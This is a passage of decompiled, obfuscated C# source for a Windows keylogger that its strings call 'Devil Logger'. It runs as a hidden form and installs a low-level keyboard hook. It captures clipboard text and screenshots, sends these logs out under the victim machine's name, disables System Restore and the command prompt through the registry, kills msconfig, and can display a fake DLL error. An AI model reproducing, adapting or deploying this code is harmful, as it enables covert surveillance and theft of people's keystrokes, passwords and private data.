using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns0;
using ns2;

namespace ns3;

internal sealed class Form1 : Form
{
	public sealed class Class5
	{
		internal struct Struct0
		{
			public int int_0;

			public int int_1;

			public int int_2;

			public int int_3;

			public int int_4;
		}

		internal delegate int Delegate0(int int_0, int int_1, ref Struct0 struct0_0);

		public delegate void Delegate1(Keys keys_0);

		public delegate void Delegate2(Keys keys_0);

		private static List<WeakReference> list_0 = new List<WeakReference>();

		internal static Delegate1 delegate1_0;

		internal static Delegate2 delegate2_0;

		internal static int int_0;

		private static Delegate0 delegate0_0;

		[DebuggerNonUserCode]
		private unsafe static void smethod_0(object object_0)
		{
			void* ptr = stackalloc byte[18];
			lock (list_0)
			{
				((byte*)ptr)[16] = ((list_0.Count == list_0.Capacity) ? ((byte)1) : ((byte)0));
				if (((byte*)ptr)[16] != 0)
				{
					*(int*)ptr = 0;
					byte* num = (byte*)ptr + 4;
					*(int*)((byte*)ptr + 8) = checked(list_0.Count - 1);
					*(int*)num = 0;
					while (true)
					{
						int num2 = *(int*)((byte*)ptr + 4);
						*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 8);
						if (num2 > *(int*)((byte*)ptr + 12))
						{
							break;
						}
						WeakReference weakReference = list_0[*(int*)((byte*)ptr + 4)];
						((byte*)ptr)[16] = (weakReference.IsAlive ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[16] != 0)
						{
							((byte*)ptr)[17] = ((*(int*)((byte*)ptr + 4) != *(int*)ptr) ? ((byte)1) : ((byte)0));
							if (((byte*)ptr)[17] != 0)
							{
								list_0[*(int*)ptr] = list_0[*(int*)((byte*)ptr + 4)];
							}
							checked
							{
								(*unchecked((int*)ptr))++;
							}
						}
						checked
						{
							(*unchecked((int*)((byte*)ptr + 4)))++;
						}
					}
					list_0.RemoveRange(*(int*)ptr, checked(list_0.Count - *unchecked((int*)ptr)));
					list_0.Capacity = list_0.Count;
				}
				list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
			}
		}

		public Class5()
		{
			smethod_0(this);
			delegate0_0 = Class15.smethod_28;
			int_0 = Class15.SetWindowsHookExA(13, delegate0_0, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
		}

		void object.Finalize()
		{
			Class15.UnhookWindowsHookEx(int_0);
			base.Finalize();
		}
	}

	private static List<WeakReference> list_0 = new List<WeakReference>();

	private IContainer icontainer_0;

	private TextBox textBox_0;

	private Timer timer_0;

	private Timer timer_1;

	private Timer timer_2;

	private Timer timer_3;

	private Timer timer_4;

	private Timer timer_5;

	private Timer timer_6;

	private TextBox textBox_1;

	private Label label_0;

	private Timer timer_7;

	private TextBox textBox_2;

	private TextBox textBox_3;

	private TextBox textBox_4;

	private Timer timer_8;

	private Timer timer_9;

	private TextBox textBox_5;

	private Timer timer_10;

	internal string[] string_0;

	private string string_1;

	private string string_2;

	private string string_3;

	private string string_4;

	private string string_5;

	private string string_6;

	private string string_7;

	private string string_8;

	private string string_9;

	private string string_10;

	private string string_11;

	private string string_12;

	private string string_13;

	private string string_14;

	private string string_15;

	private string string_16;

	private string string_17;

	private string string_18;

	private string string_19;

	private Class5 class5_0;

	private string string_20;

	private string string_21;

	internal Process[] process_0;

	internal int int_0;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		smethod_0(this);
		string_19 = Path.GetTempPath();
		vmethod_34(new Class5());
		string_20 = null;
		process_0 = Process.GetProcesses();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private unsafe static void smethod_0(object object_0)
	{
		void* ptr = stackalloc byte[18];
		lock (list_0)
		{
			((byte*)ptr)[16] = ((list_0.Count == list_0.Capacity) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[16] != 0)
			{
				*(int*)ptr = 0;
				byte* num = (byte*)ptr + 4;
				*(int*)((byte*)ptr + 8) = checked(list_0.Count - 1);
				*(int*)num = 0;
				while (true)
				{
					int num2 = *(int*)((byte*)ptr + 4);
					*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 8);
					if (num2 > *(int*)((byte*)ptr + 12))
					{
						break;
					}
					WeakReference weakReference = list_0[*(int*)((byte*)ptr + 4)];
					((byte*)ptr)[16] = (weakReference.IsAlive ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[16] != 0)
					{
						((byte*)ptr)[17] = ((*(int*)((byte*)ptr + 4) != *(int*)ptr) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[17] != 0)
						{
							list_0[*(int*)ptr] = list_0[*(int*)((byte*)ptr + 4)];
						}
						checked
						{
							(*unchecked((int*)ptr))++;
						}
					}
					checked
					{
						(*unchecked((int*)((byte*)ptr + 4)))++;
					}
				}
				list_0.RemoveRange(*(int*)ptr, checked(list_0.Count - *unchecked((int*)ptr)));
				list_0.Capacity = list_0.Count;
			}
			list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
		}
	}

	[DebuggerNonUserCode]
	void Form.Dispose(bool disposing)
	{
		try
		{
			if ((disposing && icontainer_0 != null) ? true : false)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		//IL_006b: Expected O, but got Unknown
		//IL_0072: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_008d: Expected O, but got Unknown
		//IL_008e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0098: Expected O, but got Unknown
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Expected O, but got Unknown
		//IL_00aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b4: Expected O, but got Unknown
		//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bf: Expected O, but got Unknown
		//IL_00c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ca: Expected O, but got Unknown
		//IL_00cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d5: Expected O, but got Unknown
		//IL_00dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e6: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		icontainer_0 = new Container();
		vmethod_1(new TextBox());
		vmethod_3(new Timer(icontainer_0));
		vmethod_5(new Timer(icontainer_0));
		vmethod_6(new Timer(icontainer_0));
		vmethod_8(new Timer(icontainer_0));
		vmethod_10(new Timer(icontainer_0));
		vmethod_11(new Timer(icontainer_0));
		vmethod_13(new Timer(icontainer_0));
		vmethod_15(new TextBox());
		vmethod_17(new Label());
		vmethod_19(new Timer(icontainer_0));
		vmethod_21(new TextBox());
		vmethod_23(new TextBox());
		vmethod_25(new TextBox());
		vmethod_27(new Timer(icontainer_0));
		vmethod_29(new Timer(icontainer_0));
		vmethod_31(new TextBox());
		vmethod_33(new Timer(icontainer_0));
		((Control)this).SuspendLayout();
		TextBox obj = vmethod_0();
		Point location = new Point(12, 12);
		((Control)obj).set_Location(location);
		vmethod_0().set_Multiline(true);
		((Control)vmethod_0()).set_Name("TextBox1");
		TextBox obj2 = vmethod_0();
		Size size = new Size(355, 219);
		((Control)obj2).set_Size(size);
		((Control)vmethod_0()).set_TabIndex(0);
		vmethod_2().set_Interval(1);
		vmethod_4().set_Interval(1);
		vmethod_9().set_Interval(1);
		TextBox obj3 = vmethod_14();
		location = new Point(12, 278);
		((Control)obj3).set_Location(location);
		vmethod_14().set_Multiline(true);
		((Control)vmethod_14()).set_Name("TextBox2");
		TextBox obj4 = vmethod_14();
		size = new Size(355, 30);
		((Control)obj4).set_Size(size);
		((Control)vmethod_14()).set_TabIndex(1);
		vmethod_16().set_AutoSize(true);
		Label obj5 = vmethod_16();
		location = new Point(165, 323);
		((Control)obj5).set_Location(location);
		((Control)vmethod_16()).set_Name("lblnumb");
		Label obj6 = vmethod_16();
		size = new Size(13, 13);
		((Control)obj6).set_Size(size);
		((Control)vmethod_16()).set_TabIndex(2);
		vmethod_16().set_Text("1");
		TextBox obj7 = vmethod_20();
		location = new Point(12, 367);
		((Control)obj7).set_Location(location);
		((Control)vmethod_20()).set_Name("yol");
		TextBox obj8 = vmethod_20();
		size = new Size(93, 20);
		((Control)obj8).set_Size(size);
		((Control)vmethod_20()).set_TabIndex(3);
		TextBox obj9 = vmethod_22();
		location = new Point(133, 367);
		((Control)obj9).set_Location(location);
		((Control)vmethod_22()).set_Name("random");
		TextBox obj10 = vmethod_22();
		size = new Size(93, 20);
		((Control)obj10).set_Size(size);
		((Control)vmethod_22()).set_TabIndex(4);
		TextBox obj11 = vmethod_24();
		location = new Point(248, 367);
		((Control)obj11).set_Location(location);
		((Control)vmethod_24()).set_Name("yol2");
		TextBox obj12 = vmethod_24();
		size = new Size(93, 20);
		((Control)obj12).set_Size(size);
		((Control)vmethod_24()).set_TabIndex(5);
		TextBox obj13 = vmethod_30();
		location = new Point(26, 429);
		((Control)obj13).set_Location(location);
		((Control)vmethod_30()).set_Name("yoltxt");
		TextBox obj14 = vmethod_30();
		size = new Size(93, 20);
		((Control)obj14).set_Size(size);
		((Control)vmethod_30()).set_TabIndex(6);
		vmethod_32().set_Interval(60000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		size = new Size(8, 8);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)vmethod_30());
		((Control)this).get_Controls().Add((Control)(object)vmethod_24());
		((Control)this).get_Controls().Add((Control)(object)vmethod_22());
		((Control)this).get_Controls().Add((Control)(object)vmethod_20());
		((Control)this).get_Controls().Add((Control)(object)vmethod_16());
		((Control)this).get_Controls().Add((Control)(object)vmethod_14());
		((Control)this).get_Controls().Add((Control)(object)vmethod_0());
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_0()
	{
		return textBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_1(TextBox textBox_6)
	{
		textBox_0 = textBox_6;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Timer vmethod_2()
	{
		return timer_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_3(Timer timer_11)
	{
		EventHandler eventHandler = method_0;
		if (timer_0 != null)
		{
			timer_0.remove_Tick(eventHandler);
		}
		timer_0 = timer_11;
		if (timer_0 != null)
		{
			timer_0.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Timer vmethod_4()
	{
		return timer_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_5(Timer timer_11)
	{
		EventHandler eventHandler = method_1;
		if (timer_1 != null)
		{
			timer_1.remove_Tick(eventHandler);
		}
		timer_1 = timer_11;
		if (timer_1 != null)
		{
			timer_1.add_Tick(eventHandler);
		}
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_6(Timer timer_11)
	{
		EventHandler eventHandler = method_2;
		if (timer_2 != null)
		{
			timer_2.remove_Tick(eventHandler);
		}
		timer_2 = timer_11;
		if (timer_2 != null)
		{
			timer_2.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Timer vmethod_7()
	{
		return timer_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_8(Timer timer_11)
	{
		EventHandler eventHandler = method_3;
		if (timer_3 != null)
		{
			timer_3.remove_Tick(eventHandler);
		}
		timer_3 = timer_11;
		if (timer_3 != null)
		{
			timer_3.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Timer vmethod_9()
	{
		return timer_4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_10(Timer timer_11)
	{
		EventHandler eventHandler = method_4;
		if (timer_4 != null)
		{
			timer_4.remove_Tick(eventHandler);
		}
		timer_4 = timer_11;
		if (timer_4 != null)
		{
			timer_4.add_Tick(eventHandler);
		}
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_11(Timer timer_11)
	{
		EventHandler eventHandler = method_5;
		if (timer_5 != null)
		{
			timer_5.remove_Tick(eventHandler);
		}
		timer_5 = timer_11;
		if (timer_5 != null)
		{
			timer_5.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Timer vmethod_12()
	{
		return timer_6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_13(Timer timer_11)
	{
		EventHandler eventHandler = method_6;
		if (timer_6 != null)
		{
			timer_6.remove_Tick(eventHandler);
		}
		timer_6 = timer_11;
		if (timer_6 != null)
		{
			timer_6.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_14()
	{
		return textBox_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_15(TextBox textBox_6)
	{
		textBox_1 = textBox_6;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Label vmethod_16()
	{
		return label_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_17(Label label_1)
	{
		label_0 = label_1;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Timer vmethod_18()
	{
		return timer_7;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_19(Timer timer_11)
	{
		EventHandler eventHandler = method_7;
		if (timer_7 != null)
		{
			timer_7.remove_Tick(eventHandler);
		}
		timer_7 = timer_11;
		if (timer_7 != null)
		{
			timer_7.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_20()
	{
		return textBox_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_21(TextBox textBox_6)
	{
		textBox_2 = textBox_6;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_22()
	{
		return textBox_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_23(TextBox textBox_6)
	{
		textBox_3 = textBox_6;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_24()
	{
		return textBox_4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_25(TextBox textBox_6)
	{
		textBox_4 = textBox_6;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Timer vmethod_26()
	{
		return timer_8;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_27(Timer timer_11)
	{
		EventHandler eventHandler = method_8;
		if (timer_8 != null)
		{
			timer_8.remove_Tick(eventHandler);
		}
		timer_8 = timer_11;
		if (timer_8 != null)
		{
			timer_8.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Timer vmethod_28()
	{
		return timer_9;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_29(Timer timer_11)
	{
		EventHandler eventHandler = method_9;
		if (timer_9 != null)
		{
			timer_9.remove_Tick(eventHandler);
		}
		timer_9 = timer_11;
		if (timer_9 != null)
		{
			timer_9.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_30()
	{
		return textBox_5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_31(TextBox textBox_6)
	{
		textBox_5 = textBox_6;
	}

	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual Timer vmethod_32()
	{
		return timer_10;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	internal virtual void vmethod_33(Timer timer_11)
	{
		EventHandler eventHandler = method_10;
		if (timer_10 != null)
		{
			timer_10.remove_Tick(eventHandler);
		}
		timer_10 = timer_11;
		if (timer_10 != null)
		{
			timer_10.add_Tick(eventHandler);
		}
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	[DebuggerNonUserCode]
	private virtual void vmethod_34(Class5 class5_1)
	{
		class5_0 = class5_1;
	}

	private void method_0(object sender, EventArgs e)
	{
		TextBox val = vmethod_0();
		val.set_Text(val.get_Text() + Class15.smethod_24(this));
	}

	private unsafe void method_1(object sender, EventArgs e)
	{
		void* ptr = stackalloc byte[2];
		*(bool*)ptr = Operators.CompareString(string_20, Class15.smethod_45(this), false) != 0;
		if (*(bool*)ptr)
		{
			((byte*)ptr)[1] = ((Operators.CompareString(Class15.smethod_45(this), "", false) == 0) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[1] == 0)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "=============={" + Class15.smethod_45(this) + "}==============\r\n");
				string_20 = Class15.smethod_45(this);
			}
		}
	}

	public static void smethod_1()
	{
		string executablePath = Application.get_ExecutablePath();
		string executablePath2 = Application.get_ExecutablePath();
		Class15.MoveFileExW(Strings.Left(executablePath, Class15.GetModuleFileNameA(0, ref executablePath2, 256)), Path.GetTempPath() + "\\tmpG" + DateTime.Now.Millisecond + ".tmp", 8L);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0354: Unknown result type (might be due to invalid IL or missing references)
		((Control)this).set_Visible(false);
		((Control)this).Hide();
		try
		{
			((ServerComputer)Class1.smethod_0()).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"1", RegistryValueKind.DWord);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		Class15.smethod_29(this);
		FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
		checked
		{
			string_1 = Strings.Space((int)FileSystem.LOF(1));
			string_2 = Strings.Space((int)FileSystem.LOF(1));
			string_3 = Strings.Space((int)FileSystem.LOF(1));
			string_4 = Strings.Space((int)FileSystem.LOF(1));
			string_5 = Strings.Space((int)FileSystem.LOF(1));
			string_6 = Strings.Space((int)FileSystem.LOF(1));
			string_7 = Strings.Space((int)FileSystem.LOF(1));
			string_9 = Strings.Space((int)FileSystem.LOF(1));
			string_8 = Strings.Space((int)FileSystem.LOF(1));
			string_14 = Strings.Space((int)FileSystem.LOF(1));
			string_10 = Strings.Space((int)FileSystem.LOF(1));
			string_11 = Strings.Space((int)FileSystem.LOF(1));
			string_12 = Strings.Space((int)FileSystem.LOF(1));
			string_13 = Strings.Space((int)FileSystem.LOF(1));
			string_15 = Strings.Space((int)FileSystem.LOF(1));
			string_16 = Strings.Space((int)FileSystem.LOF(1));
			string_17 = Strings.Space((int)FileSystem.LOF(1));
			string_18 = Strings.Space((int)FileSystem.LOF(1));
			FileSystem.FileGet(1, ref string_1, -1L, false);
			FileSystem.FileGet(1, ref string_2, -1L, false);
			FileSystem.FileGet(1, ref string_3, -1L, false);
			FileSystem.FileGet(1, ref string_4, -1L, false);
			FileSystem.FileGet(1, ref string_5, -1L, false);
			FileSystem.FileGet(1, ref string_6, -1L, false);
			FileSystem.FileGet(1, ref string_7, -1L, false);
			FileSystem.FileGet(1, ref string_9, -1L, false);
			FileSystem.FileGet(1, ref string_8, -1L, false);
			FileSystem.FileGet(1, ref string_14, -1L, false);
			FileSystem.FileGet(1, ref string_10, -1L, false);
			FileSystem.FileGet(1, ref string_11, -1L, false);
			FileSystem.FileGet(1, ref string_12, -1L, false);
			FileSystem.FileGet(1, ref string_13, -1L, false);
			FileSystem.FileGet(1, ref string_15, -1L, false);
			FileSystem.FileGet(1, ref string_16, -1L, false);
			FileSystem.FileGet(1, ref string_17, -1L, false);
			FileSystem.FileGet(1, ref string_18, -1L, false);
			string_0 = Strings.Split(string_1, "ksajdfgsdkjfh", -1, (CompareMethod)0);
			if (Conversions.ToBoolean(string_0[18]))
			{
				Interaction.MsgBox((object)"MSCVP71.dll Bulunamadığından Uygulama Başlatılamadı\r\n Uygulamanın Yeniden Yüklenmesi Sorunu Giderebilir.", (MsgBoxStyle)16, (object)"MSCVP71.dll");
			}
			if (Conversions.ToBoolean(string_0[17]))
			{
				try
				{
					Interaction.Shell("REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f", (AppWinStyle)0, false, -1);
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(string_0[15]))
			{
				smethod_1();
			}
			if (Conversions.ToBoolean(string_0[16]))
			{
				vmethod_28().Start();
			}
			if (!Conversions.ToBoolean(string_0[6]))
			{
			}
			if (Conversions.ToBoolean(string_0[10]))
			{
				Class15.smethod_23();
				Class15.smethod_34();
			}
			if (Conversions.ToBoolean(string_0[14]))
			{
				Class15.smethod_64();
			}
			if (Conversions.ToBoolean(string_0[12]))
			{
				Class15.smethod_12();
			}
			if (Conversions.ToBoolean(string_0[13]))
			{
				Class15.smethod_39();
				Class15.smethod_55();
				Class15.smethod_42();
			}
			if (Conversions.ToBoolean(string_0[11]))
			{
				Class15.smethod_35();
				Class15.smethod_47();
				Class15.smethod_58();
				Class15.smethod_68();
				Class15.smethod_31();
				Class15.smethod_3();
				Class15.smethod_60();
				Class15.smethod_4();
				Class15.smethod_59();
				Class15.smethod_56();
				Class15.smethod_46();
			}
			if (Conversions.ToBoolean(string_0[8]))
			{
				Class15.smethod_57();
			}
			if (Conversions.ToBoolean(string_0[9]))
			{
				Class15.smethod_16();
			}
			if (Conversions.ToBoolean(string_0[7]))
			{
				Class15.smethod_36();
			}
			vmethod_7().set_Interval(Convert.ToInt32(string_0[5]));
			vmethod_18().set_Interval(Convert.ToInt32(string_0[5]));
			vmethod_12().Start();
			vmethod_9().Start();
			vmethod_2().Start();
			vmethod_4().Start();
			vmethod_7().Start();
			vmethod_18().Start();
			vmethod_26().Start();
			vmethod_32().Start();
		}
	}

	private void method_2(object sender, EventArgs e)
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_3(object sender, EventArgs e)
	{
		Class15.smethod_20(this);
		string text = "Devil Logger Kopyalanan Veriler " + ((ServerComputer)Class1.smethod_0()).get_Name();
		string text2 = vmethod_14().get_Text();
		Class15.smethod_0(text2, this, text);
		string text3 = "Devil Logger Ekran ve Log Kayıtları " + ((ServerComputer)Class1.smethod_0()).get_Name();
		string text4 = vmethod_0().get_Text();
		Class15.smethod_33(text3, this, text4);
		((TextBoxBase)vmethod_0()).Clear();
		((TextBoxBase)vmethod_14()).Clear();
	}

	private void method_4(object sender, EventArgs e)
	{
		if (vmethod_0().get_Text().Contains("["))
		{
			vmethod_0().set_Text(vmethod_0().get_Text().Replace("[", "ğ"));
		}
		if (vmethod_0().get_Text().Contains(";"))
		{
			vmethod_0().set_Text(vmethod_0().get_Text().Replace(";", "ş"));
		}
		if (vmethod_0().get_Text().Contains("\\"))
		{
			vmethod_0().set_Text(vmethod_0().get_Text().Replace("\\", "ç"));
		}
		if (vmethod_0().get_Text().Contains("/"))
		{
			vmethod_0().set_Text(vmethod_0().get_Text().Replace("/", "ö"));
		}
		if (vmethod_0().get_Text().Contains("]"))
		{
			vmethod_0().set_Text(vmethod_0().get_Text().Replace("]", "ü"));
		}
		if (vmethod_0().get_Text().Contains("'"))
		{
			vmethod_0().set_Text(vmethod_0().get_Text().Replace("'", "i"));
		}
		if (vmethod_0().get_Text().Contains(">"))
		{
			vmethod_0().set_Text(vmethod_0().get_Text().Replace(">", ":"));
		}
	}

	private void method_5(object sender, EventArgs e)
	{
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006b: Expected O, but got Unknown
		Size size = new Size(((Computer)Class1.smethod_0()).get_Screen().get_Bounds().Width, ((Computer)Class1.smethod_0()).get_Screen().get_Bounds().Height);
		Bitmap val = new Bitmap(((Computer)Class1.smethod_0()).get_Screen().get_Bounds().Width, ((Computer)Class1.smethod_0()).get_Screen().get_Bounds().Height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		Point point = new Point(0, 0);
		Point point2 = new Point(0, 0);
		val2.CopyFromScreen(point, point2, size);
	}

	private unsafe void method_6(object sender, EventArgs e)
	{
		void* ptr = stackalloc byte[2];
		*(bool*)ptr = Operators.CompareString(string_21, ((Computer)Class1.smethod_0()).get_Clipboard().GetText(), false) != 0;
		if (*(bool*)ptr)
		{
			((byte*)ptr)[1] = ((Conversions.ToDouble(vmethod_16().get_Text()) != 0.0) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[1] != 0)
			{
				vmethod_16().set_Text(Conversions.ToString(Conversions.ToDouble(vmethod_16().get_Text()) + 1.0));
				vmethod_14().set_Text(vmethod_14().get_Text() + "\r\n\r\nLog " + vmethod_16().get_Text() + " - " + ((Computer)Class1.smethod_0()).get_Clipboard().GetText());
				string_21 = ((Computer)Class1.smethod_0()).get_Clipboard().GetText();
			}
			else
			{
				vmethod_16().set_Text(Conversions.ToString(Conversions.ToDouble(vmethod_16().get_Text()) + 1.0));
				vmethod_14().set_Text(vmethod_14().get_Text() + "Log " + vmethod_16().get_Text() + " - " + ((Computer)Class1.smethod_0()).get_Clipboard().GetText());
				string_21 = ((Computer)Class1.smethod_0()).get_Clipboard().GetText();
			}
		}
	}

	private void method_7(object sender, EventArgs e)
	{
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		try
		{
			Random random = new Random();
			int num = random.Next(1000, 9999);
			Size size = new Size(((Computer)Class1.smethod_0()).get_Screen().get_Bounds().Width, ((Computer)Class1.smethod_0()).get_Screen().get_Bounds().Height);
			Bitmap val = new Bitmap(((Computer)Class1.smethod_0()).get_Screen().get_Bounds().Width, ((Computer)Class1.smethod_0()).get_Screen().get_Bounds().Height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			Point point = new Point(0, 0);
			Point point2 = new Point(0, 0);
			val2.CopyFromScreen(point, point2, size);
			((Image)val).Save(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + vmethod_22().get_Text() + ".png");
			vmethod_20().set_Text(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + vmethod_22().get_Text() + ".png");
			vmethod_22().set_Text(Conversions.ToString(num));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private unsafe void method_8(object sender, EventArgs e)
	{
		void* ptr = stackalloc byte[13];
		try
		{
			Process[] processesByName = Process.GetProcessesByName("msconfig");
			Process[] array = processesByName;
			*(int*)ptr = 0;
			while (true)
			{
				((byte*)ptr)[12] = ((*(int*)ptr < array.Length) ? ((byte)1) : ((byte)0));
				if (((byte*)ptr)[12] != 0)
				{
					Process process = array[*(int*)ptr];
					process.Kill();
					checked
					{
						(*unchecked((int*)ptr))++;
						continue;
					}
				}
				break;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
